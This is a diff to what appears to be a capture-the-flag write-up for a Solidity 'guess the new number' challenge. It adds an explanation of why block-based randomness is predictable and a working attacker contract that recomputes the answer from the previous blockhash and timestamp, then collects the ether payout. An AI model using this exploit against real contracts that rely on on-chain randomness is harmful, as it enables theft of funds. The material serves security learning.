@@ -6,23 +6,38 @@
 
 ### Solution
 
-- Placeholder
+- No randomness given since when you call the guess function from another contract you have easy access to the block.number and the block.timestamp and can just copy paste the method that calculates the "random" answer and use that to call the Guess contract with another contract that just calculated the answer and it will be 100% right every time
 
 ### Attacker Contract
 
 ```solidity
 contract Hack {
-    bytes32 public previousBlockHash =
-        0xaf522205a688dbca66076fb9018238a615472ee70c411ecb9e882f77d874ad40;
-    uint public previousTimestamp = 1678819296000;
+    GuessTheNewNumberChallenge guessContract;
 
-    function guessNum() external view returns (uint8) {
-        return
-            uint8(
+    constructor(address _guessContract) {
+        guessContract = GuessTheNewNumberChallenge(_guessContract);
+    }
+
+    receive() external payable {}
+
+    function attack() public payable {
+        uint8 answer = uint8(
+            uint256(
                 keccak256(
-                    abi.encodePacked(previousBlockHash, previousTimestamp)
+                    abi.encodePacked(
+                        blockhash(block.number - 1),
+                        block.timestamp
+                    )
                 )
-            );
+            )
+        );
+        require(msg.value == 1 ether, "You must send an ether, first");
+        guessContract.guess{value: 1 ether}(answer);
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    function showBalance() public view returns (uint256) {
+        return address(this).balance;
     }
 }
 ```
